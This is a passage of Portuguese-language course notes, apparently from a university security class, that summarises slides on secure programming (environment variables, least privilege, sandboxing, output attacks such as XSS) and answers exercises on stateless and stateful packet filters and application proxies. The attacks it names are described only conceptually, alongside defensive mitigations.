o gerador de números aleatórios previsível no <strong>Netscape</strong> antigo, que permitia quebrar sua criptografia; <strong>sequestro de sessão TCP</strong> por números de sequência iniciais previsíveis. O código de máquina precisa representar fielmente o algoritmo de alto nível: <strong>Ken Thompson (1984)</strong> mostrou um compilador malicioso inserindo backdoors invisíveis. <strong>Código de depuração</strong> deixado em produção pode permitir acesso indevido: o <strong>Morris Worm</strong> explorou o comando DEBUG do sendmail.</p><p><strong>Interpretação de dados e memória (slide 610):</strong> como os bits são lidos (inteiro, char, ponteiro) depende das instruções de máquina. Linguagens fracamente tipadas como C permitem manipulação direta de memória e ponteiros, o que facilita estouros de buffer e corrupção de estruturas de dados. Defesa: linguagens fortemente tipadas, ou validação rigorosa das conversões. Não liberar memória dinâmica causa <strong>vazamentos de memória</strong>, esgotamento de recursos e DoS. Linguagens com gerência automática de memória (Java, C++ na redação do slide) são preferíveis ao C manual.</p><p><strong>Concorrência (slide 611):</strong> <strong>condições de corrida</strong> ocorrem quando vários processos ou threads competem por acesso não controlado a recursos compartilhados (memória); sem sincronização, valores são corrompidos ou mudanças perdidas. Uso incorreto de primitivas de sincronização causa <strong>impasse</strong> (deadlock, espera circular), que atacantes podem disparar de propósito para DoS. Mitigação: escolha correta das primitivas, e projeto que limita as áreas compartilhadas.</p><h3 id="_3-6-interacao-com-o-sistema-operacional" tabindex="-1"><span class="cut mono-0 wght-3 slnt-3 step-1">3</span><span class="cut mono-0 wght-5 slnt-2 step-2">.</span><span class="cut mono-3 wght-2 slnt-4 step-2">6</span> <span class="cut mono-5 wght-3 slnt-4 step-1">I</span><span class="cut mono-1 wght-3 slnt-5 step-3">n</span><span class="cut mono-4 wght-4 slnt-2 step-3">t</span><span class="cut mono-2 wght-1 slnt-0 step-2">e</span><span class="cut mono-1 wght-2 slnt-1 step-0">r</span><span class="cut mono-3 wght-5 slnt-3 step-0">a</span><span class="cut mono-3 wght-1 slnt-5 step-0">ç</span><span class="cut mono-1 wght-1 slnt-5 step-2">ã</span><span class="cut mono-5 wght-3 slnt-1 step-2">o</span> <span class="cut mono-3 wght-3 slnt-2 step-1">c</span><span class="cut mono-3 wght-5 slnt-2 step-0">o</span><span class="cut mono-4 wght-5 slnt-3 step-0">m</span> <span class="cut mono-2 wght-3 slnt-1 step-2">o</span> <span class="cut mono-2 wght-0 slnt-3 step-3">s</span><span class="cut mono-0 wght-5 slnt-3 step-1">i</span><span class="cut mono-4 wght-0 slnt-0 step-1">s</span><span class="cut mono-1 wght-5 slnt-1 step-0">t</span><span class="cut mono-4 wght-1 slnt-0 step-1">e</span><span class="cut mono-4 wght-2 slnt-3 step-3">m</span><span class="cut mono-0 wght-0 slnt-3 step-2">a</span> <span class="cut mono-3 wght-4 slnt-4 step-2">o</span><span class="cut mono-1 wght-2 slnt-1 step-2">p</span><span class="cut mono-5 wght-3 slnt-1 step-2">e</span><span class="cut mono-2 wght-0 slnt-3 step-3">r</span><span class="cut mono-5 wght-5 slnt-4 step-0">a</span><span class="cut mono-1 wght-4 slnt-0 step-0">c</span><span class="cut mono-5 wght-3 slnt-2 step-3">i</span><span class="cut mono-3 wght-2 slnt-0 step-3">o</span><span class="cut mono-0 wght-0 slnt-5 step-0">n</span><span class="cut mono-1 wght-4 slnt-5 step-1">a</span><span class="cut mono-5 wght-5 slnt-1 step-1">l</span> <a class="header-anchor" href="#_3-6-interacao-com-o-sistema-operacional" aria-hidden="true">#</a></h3><p><strong>O ambiente (slide 612):</strong> o SO media o acesso a recursos e constrói o ambiente do processo: código, dados, argumentos de linha de comando e variáveis de ambiente. Tudo isso precisa ser tratado como entrada externa e validado. Recursos têm permissões de usuário e grupo; programas precisam de acesso apropriado, e acesso excessivo é perigoso.</p><p><strong>Variáveis de ambiente (slide 613):</strong> strings herdadas do processo pai (PATH, IFS, LD_LIBRARY_PATH). São um ponto de entrada para dados não confiáveis.</p><ul><li><strong>Ataque ao PATH:</strong> o atacante muda o PATH para que um script privilegiado rode um programa malicioso (um <code>grep</code> falso) em vez do utilitário do sistema.</li><li><strong>Ataque ao LD_LIBRARY_PATH:</strong> carregar bibliotecas dinâmicas maliciosas em programas privilegiados.</li><li><strong>Mitigação:</strong> evitar scripts de shell privilegiados (difíceis de proteger); usar programas compilados de encapsulamento que limpam o ambiente antes de chamar scripts; redefinir as variáveis críticas para valores seguros conhecidos no início.</li></ul><p><strong>Menor privilégio (slide 614):</strong> programas rodam com os privilégios mínimos necessários. Se um programa privilegiado (root) é comprometido, o atacante ganha controle total. Práticas: preferir privilégios de grupo a privilégios de usuário (mais fácil de auditar); programas privilegiados como servidores web não devem ser donos de todos os seus arquivos, só ler onde necessário; servidores não devem rodar como root o tempo todo: usar root só para vincular portas baixas, depois abandonar os privilégios.</p><p><strong>Modularização e isolamento (slide 615):</strong> particionar programas grandes em módulos menores e conceder privilégios elevados só aos módulos que precisam, brevemente (o servidor de correio Postfix). <strong>Sandboxing e chroot:</strong> rodar programas vulneráveis em ambientes isolados. Uma <strong>jaula chroot</strong> limita a visão do sistema de arquivos do programa a um diretório. Limitação: difícil de configurar; feito errado, o programa escapa ou falha.</p><p><strong>Chamadas de sistema e suposições (slide 616):</strong> o SO e as bibliotecas fazem buffer e reordenam por desempenho, o que pode conflitar com a segurança. Caso: <strong>apagamento seguro de arquivos (shredding)</strong>. Sobrescrever um arquivo não garante que os dados antigos sumiram: buffers da biblioteca de E/S, buffers do sistema de arquivos e controladores de disco inteligentes (que evitam reescrever o mesmo bloco, especialmente em SSDs e flash) intervêm. O programador seguro precisa entender e controlar essas camadas, por exemplo forçar flush e sync.</p><h3 id="_3-7-saida-do-programa" tabindex="-1"><span class="cut mono-2 wght-2 slnt-0 step-0">3</span><span class="cut mono-5 wght-1 slnt-1 step-0">.</span><span class="cut mono-1 wght-2 slnt-1 step-0">7</span> <span class="cut mono-0 wght-2 slnt-3 step-1">S</span><span class="cut mono-4 wght-1 slnt-4 step-1">a</span><span class="cut mono-0 wght-3 slnt-2 step-1">í</span><span class="cut mono-3 wght-2 slnt-1 step-3">d</span><span class="cut mono-1 wght-2 slnt-0 step-2">a</span> <span class="cut mono-3 wght-0 slnt-2 step-0">d</span><span class="cut mono-4 wght-4 slnt-4 step-2">o</span> <span class="cut mono-5 wght-3 slnt-3 step-3">p</span><span class="cut mono-3 wght-3 slnt-3 step-1">r</span><span class="cut mono-1 wght-1 slnt-2 step-0">o</span><span class="cut mono-3 wght-4 slnt-1 step-2">g</span><span class="cut mono-4 wght-2 slnt-5 step-1">r</span><span class="cut mono-0 wght-2 slnt-4 step-0">a</span><span class="cut mono-3 wght-1 slnt-3 step-2">m</span><span class="cut mono-4 wght-1 slnt-3 step-1">a</span> <a class="header-anchor" href="#_3-7-saida-do-programa" aria-hidden="true">#</a></h3><p><strong>Natureza da saída (slide 617):</strong> binária (protocolos de rede, estruturas gráficas) ou textual (HTML, conjuntos de caracteres). Precisa obedecer estritamente ao formato e à interpretação esperados pelo dispositivo ou usuário. <strong>O problema da origem comum:</strong> os usuários supõem que a saída foi gerada e validada pelo programa confiável. Isso falha quando o programa aceita entrada de um usuário e a mostra a outro (comentários, fóruns) sem sanitização.</p><p><strong>Ataques pela saída (slide 618):</strong></p><ul><li><strong>Ataques a terminais (legado, VT100):</strong> sequências de escape em texto malicioso podiam reprogramar teclas de função para rodar comandos arbitrários (apagar arquivos) quando a vítima via o texto.</li><li><strong>XSS:</strong> explora a confiança do navegador no site de origem. Dados de terceiros não sanitizados rodam scripts (JavaScript) no navegador da vítima.</li></ul><p><strong>Mitigação (slide 619):</strong> programas que retransmitem dados de terceiros são responsáveis pela sua segurança. Preferir <strong>lista branca</strong> de conteúdo sabidamente seguro a remover o perigoso. Conjuntos de caracteres diferentes mudam a interpretação dos metacaracteres, então a codificação precisa ser especificada explicitamente (o cabeçalho <code>Content-Type</code>), ou o navegador assume um padrão inseguro. O ataque mira o usuário ou o dispositivo de exibição, não o servidor, mas danifica a reputação do software.</p><p>Material externo:</p><ul><li>OWASP, artigo: <a href="https://owasp.org/www-project-top-ten/" target="_blank" rel="noopener">OWASP Top Ten</a> A lista atual de riscos em aplicações web à qual o slide 566 se refere.</li><li>MITRE, artigo: <a href="https://cwe.mitre.org/top25/" target="_blank" rel="noopener">CWE Top 25 Most Dangerous Software Weaknesses</a> A lista por trás das três categorias dos slides 567 a 570.</li><li>Codenomicon, site: <a href="https://heartbleed.com/" target="_blank" rel="noopener">The Heartbleed Bug</a> A página de divulgação original da leitura excessiva do OpenSSL de 2014.</li></ul><hr><h2 id="_4-lista-de-exercicios-8-resolvida-firewalls" tabindex="-1"><span class="cut mono-2 wght-1 slnt-5 step-0">4</span><span class="cut mono-3 wght-3 slnt-0 step-3">.</span> <span class="cut mono-4 wght-2 slnt-2 step-0">L</span><span class="cut mono-3 wght-3 slnt-1 step-0">i</span><span class="cut mono-2 wght-3 slnt-4 step-1">s</span><span class="cut mono-1 wght-4 slnt-5 step-2">t</span><span class="cut mono-2 wght-3 slnt-0 step-2">a</span> <span class="cut mono-1 wght-0 slnt-5 step-2">d</span><span class="cut mono-0 wght-4 slnt-0 step-2">e</span> <span class="cut mono-5 wght-4 slnt-0 step-1">e</span><span class="cut mono-5 wght-5 slnt-3 step-3">x</span><span class="cut mono-0 wght-1 slnt-2 step-2">e</span><span class="cut mono-1 wght-3 slnt-1 step-2">r</span><span class="cut mono-2 wght-2 slnt-1 step-0">c</span><span class="cut mono-1 wght-3 slnt-4 step-0">í</span><span class="cut mono-1 wght-5 slnt-5 step-2">c</span><span class="cut mono-4 wght-3 slnt-1 step-0">i</span><span class="cut mono-3 wght-2 slnt-3 step-1">o</span><span class="cut mono-4 wght-2 slnt-4 step-1">s</span> <span class="cut mono-0 wght-2 slnt-0 step-2">8</span><span class="cut mono-5 wght-3 slnt-0 step-0">,</span> <span class="cut mono-0 wght-1 slnt-3 step-1">r</span><span class="cut mono-5 wght-1 slnt-4 step-0">e</span><span class="cut mono-5 wght-2 slnt-2 step-1">s</span><span class="cut mono-2 wght-5 slnt-1 step-1">o</span><span class="cut mono-4 wght-4 slnt-3 step-0">l</span><span class="cut mono-4 wght-2 slnt-4 step-1">v</span><span class="cut mono-2 wght-3 slnt-0 step-1">i</span><span class="cut mono-2 wght-2 slnt-3 step-2">d</span><span class="cut mono-4 wght-0 slnt-5 step-2">a</span> <span class="cut mono-5 wght-1 slnt-5 step-1">(</span><span class="cut mono-5 wght-4 slnt-2 step-1">f</span><span class="cut mono-0 wght-1 slnt-4 step-1">i</span><span class="cut mono-3 wght-0 slnt-1 step-3">r</span><span class="cut mono-5 wght-1 slnt-2 step-2">e</span><span class="cut mono-5 wght-5 slnt-1 step-3">w</span><span class="cut mono-2 wght-5 slnt-5 step-2">a</span><span class="cut mono-3 wght-4 slnt-1 step-1">l</span><span class="cut mono-1 wght-5 slnt-5 step-1">l</span><span class="cut mono-2 wght-4 slnt-3 step-3">s</span><span class="cut mono-2 wght-0 slnt-3 step-1">)</span> <a class="header-anchor" href="#_4-lista-de-exercicios-8-resolvida-firewalls" aria-hidden="true">#</a></h2><h3 id="secao-1-conceitos-de-seguranca-e-estrategia-de-defesa" tabindex="-1"><span class="cut mono-2 wght-1 slnt-0 step-2">S</span><span class="cut mono-4 wght-5 slnt-0 step-1">e</span><span class="cut mono-2 wght-1 slnt-1 step-2">ç</span><span class="cut mono-3 wght-4 slnt-2 step-1">ã</span><span class="cut mono-2 wght-1 slnt-4 step-2">o</span> <span class="cut mono-2 wght-2 slnt-5 step-1">1</span><span class="cut mono-5 wght-2 slnt-0 step-2">:</span> <span class="cut mono-0 wght-1 slnt-5 step-3">c</span><span class="cut mono-1 wght-3 slnt-2 step-0">o</span><span class="cut mono-0 wght-4 slnt-5 step-1">n</span><span class="cut mono-4 wght-2 slnt-1 step-0">c</span><span class="cut mono-5 wght-0 slnt-5 step-2">e</span><span class="cut mono-1 wght-3 slnt-0 step-1">i</span><span class="cut mono-4 wght-1 slnt-4 step-3">t</span><span class="cut mono-5 wght-0 slnt-3 step-1">o</span><span class="cut mono-3 wght-4 slnt-0 step-3">s</span> <span class="cut mono-1 wght-2 slnt-2 step-2">d</span><span class="cut mono-2 wght-2 slnt-2 step-3">e</span> <span class="cut mono-1 wght-1 slnt-4 step-2">s</span><span class="cut mono-2 wght-5 slnt-3 step-2">e</span><span class="cut mono-0 wght-0 slnt-5 step-1">g</span><span class="cut mono-5 wght-5 slnt-4 step-3">u</span><span class="cut mono-3 wght-3 slnt-4 step-1">r</span><span class="cut mono-1 wght-2 slnt-4 step-1">a</span><span class="cut mono-4 wght-5 slnt-2 step-1">n</span><span class="cut mono-1 wght-4 slnt-1 step-2">ç</span><span class="cut mono-2 wght-2 slnt-2 step-3">a</span> <span class="cut mono-4 wght-5 slnt-1 step-3">e</span> <span class="cut mono-5 wght-5 slnt-0 step-0">e</span><span class="cut mono-0 wght-1 slnt-1 step-3">s</span><span class="cut mono-4 wght-5 slnt-2 step-2">t</span><span class="cut mono-5 wght-4 slnt-0 step-1">r</span><span class="cut mono-3 wght-3 slnt-2 step-3">a</span><span class="cut mono-0 wght-0 slnt-5 step-2">t</span><span class="cut mono-3 wght-5 slnt-2 step-0">é</span><span class="cut mono-2 wght-5 slnt-2 step-1">g</span><span class="cut mono-4 wght-2 slnt-0 step-2">i</span><span class="cut mono-5 wght-1 slnt-0 step-3">a</span> <span class="cut mono-5 wght-4 slnt-0 step-3">d</span><span class="cut mono-2 wght-5 slnt-0 step-2">e</span> <span class="cut mono-2 wght-4 slnt-0 step-2">d</span><span class="cut mono-1 wght-4 slnt-1 step-0">e</span><span class="cut mono-3 wght-5 slnt-0 step-3">f</span><span class="cut mono-1 wght-3 slnt-5 step-0">e</span><span class="cut mono-0 wght-1 slnt-2 step-0">s</span><span class="cut mono-3 wght-5 slnt-0 step-1">a</span> <a class="header-anchor" href="#secao-1-conceitos-de-seguranca-e-estrategia-de-defesa" aria-hidden="true">#</a></h3><p><strong>1. Defina o perímetro de rede. Qual é o papel fundamental do firewall entre as redes confiável e não confiável?</strong></p><p>O <strong>perímetro</strong> é a fronteira entre a rede interna, protegida (a rede das instalações, confiável) e a rede externa (a Internet, não confiável), slides 455 e 462. O firewall fica nessa fronteira e estabelece um <strong>enlace controlado</strong>: todo o tráfego nos dois sentidos passa por ele (o ponto de gargalo), só passa o tráfego autorizado pela política de segurança local, e o próprio firewall é imune a penetração (os três objetivos de [BELL94], slide 456). Ele protege o lado confiável de ataques vindos da Internet enquanto ainda permite à organização alcançar o mundo externo (o dilema, slide 450).</p><p><strong>2. A diferença entre a política de segurança (nível estratégico) e as regras do firewall (nível técnico). Quem dita quem?</strong></p><p>A <strong>política de segurança</strong> declara, no nível da organização, quais tipos de tráfego a organização precisa suportar e quais riscos aceita. Ela vem da <strong>avaliação de risco</strong> e da política de segurança da informação (slide 457). A <strong>política de acesso</strong> do firewall é derivada dela: uma especificação ampla, refinada em elementos de filtro específicos, e implementada na topologia do firewall. As <strong>regras</strong> são a implementação técnica desses elementos de filtro: endereços, portas, protocolos, ações. A política dita as regras. Uma regra sem política por trás é um erro de configuração à espera de acontecer (fraqueza 5 da NIST SP 800-41, slide 475).</p><p><strong>3. O que é a superfície de ataque? Como um filtro positivo a reduz?</strong></p><p>Os slides não definem o termo. Além dos slides: a superfície de ataque é o conjunto de pontos (serviços, portas, interfaces, entradas) pelos quais um atacante pode tentar entrar ou extrair dados. Um <strong>filtro positivo</strong> passa só os pacotes que atendem a critérios específicos e termina com um <strong>deny</strong> (slide 464). Todo serviço não autorizado explicitamente fica fechado, então as portas e serviços alcançáveis de fora encolhem até a lista da política. Essa é a capacidade 1 do firewall: proíbe serviços vulneráveis de entrar ou sair (slide 460). Um filtro negativo, com um allow no final, deixa aberto todo serviço que ninguém pensou em bloquear.</p><p><strong>4. Defesa em profundidade: com um firewall de borda robusto, por que ainda proteger os hosts? Cite uma ameaça que o firewall de borda não detém.</strong></p><p>Por causa das quatro limitações do slide 461. O firewall não detém ataques que o <strong>contornam</strong> (um sistema interno com enlace próprio a um provedor, um enlace direto a um parceiro), não detém totalmente <strong>ameaças internas</strong> (um funcionário descontente, um funcionário enganado por phishing), não detém <strong>redes sem fio inseguras</strong> alcançadas de fora, e não detém um <strong>dispositivo portátil infectado (BYOD)</strong> trazido de fora. Além disso, tráfego cifrado por uma VPN que termina atrás do firewall é invisível para ele (slide 506). Qualquer uma dessas ameaças cai dentro do perímetro, onde só restam as defesas do host: antivírus (HIDS por assinatura, slide 548), correções, firewalls de host (slide 493). Defesa em profundidade significa que a falha de uma camada não expõe tudo (slide 455). Ameaça de exemplo: o laptop de um funcionário infectado em casa e conectado à LAN.</p><h3 id="secao-2-filtros-de-pacotes" tabindex="-1"><span class="cut mono-3 wght-5 slnt-5 step-0">S</span><span class="cut mono-2 wght-0 slnt-3 step-1">e</span><span class="cut mono-1 wght-0 slnt-4 step-2">ç</span><span class="cut mono-5 wght-3 slnt-2 step-2">ã</span><span class="cut mono-2 wght-0 slnt-3 step-0">o</span> <span class="cut mono-1 wght-1 slnt-5 step-0">2</span><span class="cut mono-0 wght-3 slnt-3 step-0">:</span> <span class="cut mono-2 wght-0 slnt-5 step-2">f</span><span class="cut mono-3 wght-5 slnt-0 step-1">i</span><span class="cut mono-0 wght-3 slnt-1 step-0">l</span><span class="cut mono-0 wght-4 slnt-5 step-0">t</span><span class="cut mono-4 wght-5 slnt-3 step-1">r</span><span class="cut mono-3 wght-3 slnt-4 step-3">o</span><span class="cut mono-1 wght-4 slnt-1 step-0">s</span> <span class="cut mono-2 wght-3 slnt-2 step-2">d</span><span class="cut mono-1 wght-3 slnt-4 step-0">e</span> <span class="cut mono-0 wght-5 slnt-3 step-0">p</span><span class="cut mono-1 wght-4 slnt-2 step-2">a</span><span class="cut mono-1 wght-0 slnt-5 step-0">c</span><span class="cut mono-4 wght-5 slnt-2 step-3">o</span><span class="cut mono-5 wght-0 slnt-0 step-0">t</span><span class="cut mono-3 wght-4 slnt-0 step-1">e</span><span class="cut mono-4 wght-0 slnt-5 step-1">s</span> <a class="header-anchor" href="#secao-2-filtros-de-pacotes" aria-hidden="true">#</a></h3><p><strong>1. Como funciona um filtro de pacotes sem estado. Que informação ele usa?</strong></p><p>Ele aplica uma lista de regras a cada pacote IP, de entrada e de saída, e o encaminha ou descarta (slide 465). As regras comparam os cabeçalhos IP e TCP ou UDP, de cima para baixo; a primeira correspondência decide, e sem correspondência a ação padrão se aplica (slide 466). Informação usada, só camadas 3 e 4: endereço IP de origem, endereço IP de destino, porta de origem e de destino, o campo de protocolo IP (TCP, UDP, ICMP), e a interface. Ele não guarda memória entre pacotes.</p><p><strong>2. Uma vantagem e uma limitação do filtro sem estado.</strong></p><p>Vantagem (slide 473): <strong>velocidade</strong>, porque não inspeciona a carga útil; também simplicidade e transparência para os usuários. Limitação (slides 474 e 475): não examina dados das camadas superiores, então não bloqueia ataques a vulnerabilidades de aplicação ou comandos específicos de aplicação. Outras limitações: registro limitado, sem autenticação avançada de usuário, vulnerável a falsificação de IP e fragmentos minúsculos, fácil de configurar errado.</p><p><strong>3. O problema do tráfego de retorno e como o filtro com estado o resolve.</strong></p><p>Um servidor usa uma porta bem conhecida abaixo de 1024, um cliente uma porta temporária acima de 1024, por exemplo 49152 (slide 478). Para deixar a resposta da porta 25 chegar à porta 49152, um filtro sem estado precisa permitir tráfego de entrada para <strong>todas</strong> as portas altas (regra 4 da Tabela 9.1), o que deixa um atacante alcançar qualquer serviço interno acima de 1023, como um proxy na 8080 (slide 469). O filtro com estado mantém uma <strong>tabela de estado</strong> das conexões TCP de saída ativas, e permite tráfego de entrada para uma porta alta <strong>só</strong> se o pacote corresponde a uma entrada (slide 479). A resposta a uma conexão que o lado interno abriu é aceita; um pacote não solicitado para uma porta alta não é.</p><p><strong>4. Defina o filtro de pacotes com estado.</strong></p><p>Um firewall que revisa a mesma informação de cabeçalho L3 e L4 que um filtro de pacotes <strong>e</strong> registra o estado de cada conexão TCP (estabelecida, encerrando), em um diretório de conexões ativas (slide 480). Ele aperta as regras para o tráfego TCP ao vincular pacotes de entrada a conexões que existem. Alguns produtos também rastreiam números de sequência TCP contra sequestro de sessão, e fazem inspeção limitada de aplicação para protocolos como FTP, IM e SIPS.</p><p><strong>5. O que é a tabela de estado e qual é a sua função para um pacote de entrada?</strong></p><p>A tabela de estado (Tabela 9.2, slide 481) contém uma entrada por conexão estabelecida: endereço de origem, porta de origem, endereço de destino, porta de destino, estado da conexão. Para um pacote de entrada para uma porta alta, o firewall procura uma entrada com os endereços e portas correspondentes. Uma correspondência significa que o pacote pertence a uma conexão que o lado interno abriu, e ele é aceito. Sem correspondência o pacote é não solicitado, e a lista de regras ou a política padrão decide, normalmente descartar.</p><p><strong>6. Uma regra de bloqueio é adicionada a um firewall com estado e a tabela de estado não é modificada. O que acontece com uma comunicação já em andamento? Justifique.</strong></p><p>A comunicação <strong>continua</strong> até encerrar ou sua entrada expirar. Justificativa pelo slide 479: o firewall com estado aceita um pacote que corresponde a uma entrada existente da tabela de estado. A entrada foi criada quando a conexão foi estabelecida, antes da nova regra, então os pacotes dessa conexão continuam correspondendo a ela. A nova regra só afeta conexões <strong>novas</strong>, cujo primeiro pacote passa pela lista de regras e é bloqueado, então nenhuma entrada é criada. Além dos slides: é assim que as implementações comuns se comportam (netfilter com uma regra &quot;accept ESTABLISHED&quot; antes das regras de bloqueio). Para deter a conexão em andamento, o administrador precisa também limpar a entrada da tabela de estado.</p><h3 id="secao-3-firewalls-de-aplicacao-proxies" tabindex="-1"><span class="cut mono-2 wght-2 slnt-2 step-1">S</span><span class="cut mono-2 wght-2 slnt-3 step-3">e</span><span class="cut mono-2 wght-3 slnt-4 step-0">ç</span><span class="cut mono-2 wght-5 slnt-2 step-3">ã</span><span class="cut mono-4 wght-1 slnt-0 step-0">o</span> <span class="cut mono-3 wght-5 slnt-3 step-0">3</span><span class="cut mono-0 wght-4 slnt-3 step-0">:</span> <span class="cut mono-3 wght-3 slnt-3 step-1">f</span><span class="cut mono-0 wght-3 slnt-5 step-1">i</span><span class="cut mono-2 wght-5 slnt-4 step-2">r</span><span class="cut mono-4 wght-1 slnt-5 step-1">e</span><span class="cut mono-0 wght-5 slnt-0 step-3">w</span><span class="cut mono-3 wght-5 slnt-3 step-3">a</span><span class="cut mono-4 wght-5 slnt-5 step-1">l</span><span class="cut mono-1 wght-5 slnt-5 step-3">l</span><span class="cut mono-1 wght-5 slnt-5 step-3">s</span> <span class="cut mono-2 wght-0 slnt-5 step-2">d</span><span class="cut mono-5 wght-3 slnt-2 step-1">e</span> <span class="cut mono-4 wght-1 slnt-2 step-2">a</span><span class="cut mono-0 wght-3 slnt-5 step-3">p</span><span class="cut mono-0 wght-1 slnt-2 step-3">l</span><span class="cut mono-3 wght-5 slnt-5 step-0">i</span><span class="cut mono-2 wght-2 slnt-4 step-3">c</span><span class="cut mono-1 wght-2 slnt-4 step-0">a</span><span class="cut mono-2 wght-0 slnt-5 step-0">ç</span><span class="cut mono-0 wght-5 slnt-4 step-0">ã</span><span class="cut mono-0 wght-0 slnt-4 step-1">o</span> <span class="cut mono-3 wght-3 slnt-2 step-1">(</span><span class="cut mono-0 wght-5 slnt-5 step-1">p</span><span class="cut mono-1 wght-1 slnt-4 step-1">r</span><span class="cut mono-2 wght-4 slnt-0 step-3">o</span><span class="cut mono-3 wght-2 slnt-4 step-3">x</span><span class="cut mono-3 wght-5 slnt-5 step-3">i</span><span class="cut mono-3 wght-1 slnt-4 step-0">e</span><span class="cut mono-4 wght-1 slnt-5 step-2">s</span><span class="cut mono-0 wght-5 slnt-2 step-1">)</span> <a class="header-anchor" href="#secao-3-firewalls-de-aplicacao-proxies" aria-hidden="true">#</a></h3><p><strong>1. Em qual camada da pilha TCP/IP o proxy de aplicação opera?</strong></p><p>Na <strong>camada de aplicação</strong>, o topo da pilha. Ele retransmite tráfego de nível de aplicação como Telnet, FTP, SMTP e HTTP (slide 482), e a política que impõe se baseia no protocolo de aplicação (slide 458).</p><p><strong>2. Compare firewalls de aplicação com filtros de pacotes sem estado e com estado.</strong></p><p>Veja a tabela da seção 1.10. O filtro de pacotes examina cabeçalhos L3 e L4 de cada pacote, sem estado e sem carga útil: rápido, simples, transparente, mas cego a ataques de aplicação, fraco em registro, vulnerável a falsificação e erro de configuração. O filtro com estado acrescenta o estado da conexão e resolve o problema das portas altas, com inspeção limitada da carga útil. O proxy de aplicação emenda duas conexões e vê todo o diálogo de aplicação: controle granular de comandos, registro completo no nível de aplicação, mais seguro porque analisa umas poucas aplicações permitidas em vez de incontáveis combinações de cabeçalho (slide 483). Seu custo é sobrecarga de processamento nas duas conexões, e precisa de código de proxy para cada aplicação suportada. O híbrido do slide 484 usa um proxy na entrada e um proxy de circuito mais barato na saída.</p><p><strong>3. O que o firewall de aplicação pode inspecionar que os filtros de pacotes não podem? Exemplo.</strong></p><p>A <strong>carga útil</strong> e os comandos e conteúdo da aplicação. Fraqueza 1 do filtro de pacotes (slide 474): se a aplicação é permitida, todas as suas funções são permitidas. O proxy pode suportar só recursos específicos: permitir HTTP <strong>GET</strong> e negar <strong>POST</strong> (slide 483), verificar correio SMTP contra spam, ou permitir requisições HTTP só a sites autorizados (slide 458). Ele também pode autenticar o usuário antes de retransmitir (slide 482), o que o filtro de pacotes não pode fazer.</p><p><strong>4. Como essa posição permite ao firewall de aplicação proteger contra ataques a vulnerabilidades do software servidor?</strong></p><p>Não há conexão fim a fim: o cliente fala com o proxy, e o próprio proxy abre a conexão com o servidor (slide 482). Um exploit alcança portanto o <strong>analisador do proxy</strong> primeiro, não o servidor. O proxy implementa só um <strong>subconjunto</strong> dos comandos da aplicação (slide 490) e só os recursos que o administrador aceita, então requisições malformadas ou não suportadas não são retransmitidas. O proxy é um programa muito pequeno, menos de 1.000 linhas contra 20.000 de uma aplicação de correio, então é mais fácil de auditar (slide 491), roda sem privilégios, sem acesso a disco, em um host bastião reforçado (slide 492). Uma vulnerabilidade no software servidor só é alcançável por requisições que o proxy escolheu encaminhar.</p><h3 id="secao-4-logica-de-filtragem-e-implementacao-de-politica" tabindex="-1"><span class="cut mono-2 wght-1 slnt-3 step-0">S</span><span class="cut mono-2 wght-3 slnt-5 step-2">e</span><span class="cut mono-5 wght-4 slnt-4 step-1">ç</span><span class="cut mono-3 wght-5 slnt-2 step-1">ã</span><span class="cut mono-0 wght-0 slnt-4 step-3">o</span> <span class="cut mono-2 wght-3 slnt-3 step-0">4</span><span class="cut mono-5 wght-2 slnt-0 step-0">:</span> <span class="cut mono-1 wght-3 slnt-3 step-0">l</span><span class="cut mono-1 wght-4 slnt-2 step-3">ó</span><span class="cut mono-3 wght-5 slnt-0 step-1">g</span><span class="cut mono-4 wght-4 slnt-4 step-1">i</span><span class="cut mono-1 wght-2 slnt-3 step-0">c</span><span class="cut mono-3 wght-1 slnt-3 step-2">a</span> <span class="cut mono-2 wght-2 slnt-4 step-0">d</span><span class="cut mono-1 wght-5 slnt-2 step-3">e</span> <span class="cut mono-4 wght-5 slnt-0 step-2">f</span><span class="cut mono-5 wght-1 slnt-4 step-3">i</span><span class="cut mono-1 wght-4 slnt-1 step-3">l</span><span class="cut mono-5 wght-5 slnt-4 step-2">t</span><span class="cut mono-0 wght-1 slnt-1 step-1">r</span><span class="cut mono-5 wght-5 slnt-5 step-1">a</span><span class="cut mono-2 wght-2 slnt-1 step-3">g</span><span class="cut mono-2 wght-3 slnt-5 step-0">e</span><span class="cut mono-4 wght-3 slnt-0 step-3">m</span> <span class="cut mono-2 wght-2 slnt-1 step-0">e</span> <span class="cut mono-5 wght-0 slnt-2 step-1">i</span><span class="cut mono-0 wght-3 slnt-1 step-3">m</span><span class="cut mono-5 wght-5 slnt-3 step-0">p</span><span class="cut mono-4 wght-5 slnt-4 step-0">l</span><span class="cut mono-1 wght-1 slnt-4 step-0">e</span><span class="cut mono-4 wght-3 slnt-2 step-1">m</span><span class="cut mono-1 wght-4 slnt-2 step-1">e</span><span class="cut mono-1 wght-5 slnt-0 step-0">n</span><span class="cut mono-1 wght-2 slnt-1 step-2">t</span><span class="cut mono-2 wght-0 slnt-0 step-1">a</span><span class="cut mono-2 wght-1 slnt-0 step-1">ç</span><span class="cut mono-4 wght-2 slnt-4 step-2">ã</span><span class="cut mono-5 wght-0 slnt-5 step-2">o</span> <span class="cut mono-2 wght-3 slnt-2 step-0">d</span><span class="cut mono-1 wght-5 slnt-2 step-2">e</span> <span class="cut mono-2 wght-4 slnt-4 step-3">p</span><span class="cut mono-4 wght-4 slnt-1 step-0">o</span><span class="cut mono-0 wght-0 slnt-2 step-1">l</span><span class="cut mono-5 wght-5 slnt-3 step-0">í</span><span class="cut mono-4 wght-4 slnt-4 step-2">t</span><span class="cut mono-4 wght-4 slnt-3 step-1">i</span><span class="cut mono-2 wght-2 slnt-3 step-3">c</span><span class="cut mono-4 wght-4 slnt-2 step-3">a</span> <a class="header-anchor" href="#secao-4-logica-de-filtragem-e-implementacao-de-politica" aria-hidden="true">#</a></h3><p><strong>1. Defina o filtro positivo.</strong></p><p>Um filtro que permite só os pacotes que atendem a critérios específicos e rejeita todo o resto: tem um <strong>deny</strong> implícito no final (slide 464). Implementa a política de <strong>descarte padrão</strong>: &quot;o que não é expressamente permitido é proibido&quot; (slide 466).</p><p><strong>2. Defina o filtro negativo.</strong></p><p>Um filtro que rejeita qualquer pacote que atende a certos critérios e permite todo o resto: tem um <strong>allow</strong> implícito no final (slide 464). Implementa a política de <strong>encaminhamento padrão</strong>: &quot;o que não é expressamente proibido é permitido&quot; (slide 466).</p><p><strong>3. Filtro positivo para o servidor web 172.16.20.5.</strong></p><div class="table-wrapper"><table><thead><tr><th>Regra</th><th>IP 